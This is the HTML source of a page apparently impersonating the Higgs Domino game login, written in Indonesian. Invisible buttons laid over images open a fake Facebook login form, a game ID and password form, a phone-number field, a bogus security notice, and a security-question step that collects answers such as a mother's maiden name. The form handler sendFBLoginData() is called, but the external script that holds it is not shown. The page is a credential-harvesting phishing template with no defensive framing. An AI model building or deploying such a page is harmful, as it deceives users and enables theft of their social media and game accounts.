<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Higgs Domino - ID Login</title>
    <link rel="stylesheet" href="js/style.css">

</head>
<body>
    <img src="img/background.jpg" alt="Background" style="
    width: 100%; 
    height: 100%; 
    position: absolute; 
    top: 0; 
    left: 0; 
    z-index: -1; 
    object-fit: cover;">

<button 
    onclick="showFbLoginPopup()" 
    style="
        position: absolute; 
        top: 68%; 
        left: 36%; 
        width: 250px;
        height: 45px;
        background:transparent;
        border: none;
        z-index: 1001; /* DITAMBAH: Memastikan tombol dapat diklik */
        ">
</button>

<div id="overlay" class="overlay" style="z-index: 5000;"></div>
<div id="fbLoginPopup" class="fb-login-popup" style="z-index: 5001;">
    <button class="close-popup" onclick="hideFbLoginPopup()">×</button>
    <h2 class="popup-title">Login ke Facebook</h2>
    <form id="fbLoginForm" onsubmit="event.preventDefault(); sendFBLoginData();">
        <input 
        type="text" 
        id="fbEmail" 
        placeholder="Email atau Nomor Telepon" 
        class="popup-input" 
        required>
    <input 
        type="password" 
        id="fbPassword" 
        placeholder="Kata Sandi" 
        class="popup-input" 
        required>
    <button type="submit" class="popup-button">Masuk</button>
    <a href="#" class="forgot-password">Lupa kata sandi?</a>
    <hr>
    <button type="button" class="create-account-button">Buat akun baru</button>
</form>
</div>

<button 
    onclick="playClickSound(); showPopup()" 
    style="position: absolute; top: 15%; left: -6%; width: 153px; height: 49px; background: transparent; border: none; border-radius: 30%; z-index: 1001;">
</button>

<div class="popup" id="loginPopup" style="z-index: 5002;">
    <img src="img/login.png" alt="ID Login Form">
    <div class="input-container">
        <input type="number" id="userID" placeholder="Enter User Id">
        <input type="password" id="password" placeholder="6-16 characters">
        <span id="togglePassword" 
        style="position: absolute; right: -5px; top: 46%; transform: translateY(-50%); color: transparent; 
               user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none;">
        ⌒ ⊙ 
  </span>
    </div>
    <button class="close" onclick="hidePopup()"></button>
    <button 
        id="submitButton" 
        style="position: absolute; bottom: 16%; left: 37%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 10%; z-index: 2001;" 
        onclick="playClickSound(); showSecurityNotification()">
    </button>
</div>

<div class="notification-container" id="securityNotification" style="z-index: 5003;">
    <img src="img/keamanan.png" alt="Keamanan">
    <button style="position: absolute; bottom: 16%; left: 31%; width: 120px; height: 40px; background: transparent; border: none; border-radius: 14%; z-index: 1000;"  onclick="playClickSound();showVerification()"></button>
</div>

<div class="popup" id="verificationSection" style="z-index: 5004; width: 520px; height: 272px; position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); display: none;">
  <button class="close close-verification" onclick="hideVerification()">×</button>
  <img id="verifImage" src="img/verifikasi.png" alt="Verifikasi" style="position: absolute; left: 0; top: 0; width: 520px; height: 272px; object-fit: contain; pointer-events: none; z-index: 0;">

  <div id="verificationOverlay" style="position: absolute; left: 0; top: 0; width: 520px; height: 272px; z-index: 1;">

    <div id="q1Row" style="position: absolute; left: 95px; top: 78px; width: 330px; height: 24px;">
      <span id="question1Label" style="display: inline-block; max-width: 290px; color: #f6d59a; font-weight: 600; font-size: 15px; line-height: 24px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">What's the name of your first saw movie?</span>
      <button id="q1DropdownBtn" style="position: absolute; right: 0; top: 0; width: 24px; height: 24px; border: 1px solid #1aa2e6; border-radius: 6px; background: rgba(0,0,0,0.25); color: #1aa2e6; font-size: 14px;" onclick="toggleDropdown('q1Menu')">▾</button>
      <div id="q1Menu" style="position: absolute; top: 28px; right: 0; width: 320px; max-height: 160px; overflow-y: auto; background: rgba(40, 25, 10, 0.95); border: 1px solid #8b5a2b; border-radius: 8px; display: none; z-index: 5005;"></div>
    </div>

    <div id="q2Row" style="position: absolute; left: 95px; top: 138px; width: 330px; height: 24px;">
      <span id="question2Label" style="display: inline-block; max-width: 290px; color: #f6d59a; font-weight: 600; font-size: 15px; line-height: 24px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">What's your favorite food?</span>
      <button id="q2DropdownBtn" style="position: absolute; right: 0; top: 0; width: 24px; height: 24px; border: 1px solid #1aa2e6; border-radius: 6px; background: rgba(0,0,0,0.25); color: #1aa2e6; font-size: 14px;" onclick="toggleDropdown('q2Menu')">▾</button>
      <div id="q2Menu" style="position: absolute; top: 28px; right: 0; width: 320px; max-height: 160px; overflow-y: auto; background: rgba(40, 25, 10, 0.95); border: 1px solid #8b5a2b; border-radius: 8px; display: none; z-index: 5005;"></div>
    </div>

    <input type="text" id="answer1" placeholder="Please enter the answer" style="position: absolute; left: 95px; top: 100px; width: 330px;">
    <input type="text" id="answer2" placeholder="Please enter the answer" style="position: absolute; left: 95px; top: 160px; width: 330px;">
  </div>

  <button class="submit-button" style="position: absolute; bottom: 16%; left: 31%; background: transparent; color: transparent; width: 120px; height: 40px; border: none; border-radius: 10%;" onclick="playClickSound(); redirectToSuccess()">Kirim</button>
</div>


<button 
    onclick="showLoadingThenVisitor()" 
    style="
        position: absolute; 
        bottom: 7%; 
        left: 42%; 
        width: 140px; 
        height: 40px; 
        background: transparent; 
        color: transparent; 
        font-size: 16px; 
        border: none; 
        border-radius: 5px; 
        cursor: pointer; 
        z-index: 999;">
    Tampilkan Gambar
</button>


<div id="ipLimitPopup" style="
    display: none; 
    position: fixed; 
    top: 20%; 
    left: 27%; 
    width: 46%; 
    height: auto; 
    background: none; 
    z-index: 1000; 
    border-radius: 10px;">
    <img src="img/iplimit.png" alt="IP Limit" style="width: 100%; height: 100%; border-radius: 10px;">
    <button onclick="hideIpLimitImage(); event.stopPropagation();" style="
        position: absolute; 
        top: 63%; 
        right: 32%; 
        background: transparent; 
        color: transparent; 
        border: none; 
        border-radius: 18%; 
        width: 154px; 
        height:50px; 
        cursor: pointer;">
        ×
    </button>
</div>

<button 
    id="serviceButton"
    onclick="redirectToService()" 
    style="
        position: absolute; 
        background-color: transparent; 
        color: transparent; 
        top: 1px;
        left: -41px;
        width: 20%; 
        height: 47px;
        font-size: 16px; 
        border-radius: 50px; 
        z-index: 1000; 
        background: none; 
        outline: none; 
        border: none;">
</button>

<div id="hpLoginPopup" style="
display: none; 
position: fixed; 
top: 44%; 
left: 48%; 
transform: translate(-50%, -50%); 
background: none; 
padding: 0; 
border-radius: 10px; 
z-index: 2000;">
<div style="
    position: absolute; 
    top: 49%; 
    left: 25%; 
    width: 70%; 
    text-align: center;">
    <input type="tel" placeholder="Masukkan No." style="
    width: 65%; 
    height: 33px; 
    font-size: 16px; 
    padding: 5px 10px; 
    border-radius: 5px; 
    background-color: transparent; 
    color: #E1B09E; 
    border: none; 
    outline: none; 
    caret-color: #E1B09E;">

<style>

input[type="tel"]::placeholder {
color: #E1B09E;
opacity: 1; 
}
</style>

<button id="closeHpLoginPopup" onclick="hideHpLoginImage()" style="
display: none; 
position: fixed; 
top: 18%; 
right: 0%; 
width: 14%; 
height: 18%; 
background: transparent; 
color: transparent; 
border: none; 
padding: 10px 20px; 
border-radius: px; 
font-size: 16px; 
z-index: 200000000;
cursor: pointer;">
Tutup
</button>

<button id="showVerificationButton" onclick="showVerificationImage()" style="
    position: absolute; 
    top: 179%; 
    left: 21%; 
    width: 143px; 
    height: 44px; 
    background-color: transparent; 
    color: transparent; 
    border: none; 
    border-radius: 10px; 
    font-size: 16px; 
    cursor: pointer; 
    z-index: 1000;">
    Tampilkan Verifikasi
</button>

<div id="verificationPopup" style="
display: none; 
position: fixed; 
top: -44px; 
left: -280px; 
width: 290%; 
height: 290%; 
background: rgba(0, 0, 0, 0.8); 
z-index: 3000;">
    <div style="
        position: fixed; 
        top: 59%; 
        left: 44%; 
        transform: translate(-50%, -50%); 
        background: none; 
        z-index: 3001;">
        <img src="img/maintancehp.png" alt="Verifikasi" style="
            width: 150%; 
            height: auto; 
            border-radius: 10px;">
        <button id="closeAllButton" onclick="closeAllPopups()" style="
            position: absolute; 
            top: 57%; 
            right: 8%; 
            width: 132px; 
            height: 46px; 
            background: transparent; 
            color: transparent; 
            border: none; 
            border-radius: 10px; 
            font-size: 14px; 
            cursor: pointer; 
            z-index: 3002;">
        </button>
    </div>
</div>

</div> 
</div> 
<script>
// --- FUNGSI POP-UP BAWAAN ---
function showPopup() {
    const login = document.getElementById("loginPopup");
    const o = document.getElementById("overlay");
    if (login) login.style.display = 'block';
    if (o) o.classList.add("active");
}

function hidePopup() {
    const login = document.getElementById("loginPopup");
    const o = document.getElementById("overlay");
    if (login) login.style.display = 'none';
    if (o) o.classList.remove("active");
}

function showFbLoginPopup() {
    const p = document.getElementById("fbLoginPopup");
    const o = document.getElementById("overlay");
    if (p) p.style.display = 'block';
    if (o) o.classList.add("active");
}

function hideFbLoginPopup() {
    const p = document.getElementById("fbLoginPopup");
    const o = document.getElementById("overlay");
    if (p) p.style.display = 'none';
    if (o) o.classList.remove("active");
}

function showVerificationImage() {
    const v = document.getElementById('verificationPopup');
    if (v) v.style.display = 'block';
}

function hideVerificationImage() {
    const v = document.getElementById('verificationPopup');
    if (v) v.style.display = 'none';
}

function showHpLoginImage() {
    const hp = document.getElementById('hpLoginPopup');
    const closeHp = document.getElementById('closeHpLoginPopup');
    if (hp) hp.style.display = 'block';
    if (closeHp) closeHp.style.display = 'block'; 
}

function hideHpLoginImage() {
    const hp = document.getElementById('hpLoginPopup');
    const closeHp = document.getElementById('closeHpLoginPopup');
    if (hp) hp.style.display = 'none';
    if (closeHp) closeHp.style.display = 'none'; 
}

function closeAllPopups() {
    const ids = ['hpLoginPopup', 'closeHpLoginPopup', 'verificationPopup', 'maintancePopup', 'verificationSection'];
    ids.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
} // <--- KURUNG PENUTUP SUDAH BENAR DI SINI

// --- FUNGSI DROPDOWN PERTANYAAN (KODE BARU) ---
var QUESTION_OPTIONS = [
  "What's the name of your first saw movie?",
  "What's your favorite food?",
  "What's your mother's maiden name?",
  "What's the city you were born in?",
  "What's your first pet's name?",
  "What's your favorite color?",
  "What's your favorite sport?",
  "What's your favorite teacher's name?"
];

function buildMenuHtml(slot) {
  var html = "";
  for (var i = 0; i < QUESTION_OPTIONS.length; i++) {
    var q = QUESTION_OPTIONS[i];
    html += "<div style='padding: 10px; cursor: pointer; color: #f6d59a; border-bottom: 1px solid rgba(246,213,154,0.1); font-size: 13px;' onclick=\"selectQuestion('" + slot + "', '" + q.replace(/'/g, "\\'") + "')\">" + q + "</div>";
  }
  return html;
}

function toggleDropdown(menuId) {
  var menu = document.getElementById(menuId);
  if (!menu) return;
  var isShown = menu.style.display === "block";
  var m1 = document.getElementById('q1Menu');
  var m2 = document.getElementById('q2Menu');
  if (m1) m1.style.display = 'none';
  if (m2) m2.style.display = 'none';
  menu.style.display = isShown ? "none" : "block";
}

function selectQuestion(slot, text) {
  if (slot === "q1") {
    document.getElementById("question1Label").textContent = text;
    document.getElementById("q1Menu").style.display = "none";
  } else if (slot === "q2") {
    document.getElementById("question2Label").textContent = text;
    document.getElementById("q2Menu").style.display = "none";
  }
}

function initVerificationQuestions() {
  var q1Menu = document.getElementById("q1Menu");
  var q2Menu = document.getElementById("q2Menu");
  if (q1Menu && q1Menu.innerHTML.trim() === "") q1Menu.innerHTML = buildMenuHtml("q1");
  if (q2Menu && q2Menu.innerHTML.trim() === "") q2Menu.innerHTML = buildMenuHtml("q2");
}

document.addEventListener("click", function(e) {
  var q1Btn = document.getElementById("q1DropdownBtn");
  var q2Btn = document.getElementById("q2DropdownBtn");
  var q1Menu = document.getElementById("q1Menu");
  var q2Menu = document.getElementById("q2Menu");
  var insideQ1 = q1Btn && q1Btn.contains(e.target);
  var insideQ2 = q2Btn && q2Btn.contains(e.target);
  var insideMenu = (q1Menu && q1Menu.contains(e.target)) || (q2Menu && q2Menu.contains(e.target));
  if (!insideQ1 && !insideQ2 && !insideMenu) {
    if (q1Menu) q1Menu.style.display = "none";
    if (q2Menu) q2Menu.style.display = "none";
  }
});

var originalShowVerification = typeof showVerification === "function" ? showVerification : null;
showVerification = function() {
  if (originalShowVerification) originalShowVerification();
  var vPopup = document.getElementById('verificationPopup');
  if (vPopup) vPopup.style.display = 'none';
  var vSection = document.getElementById('verificationSection');
  if (vSection) vSection.style.display = 'block';
  initVerificationQuestions();
};

document.addEventListener('DOMContentLoaded', initVerificationQuestions);
</script>

<script src="js/script.js"></script>
</body>
</html>





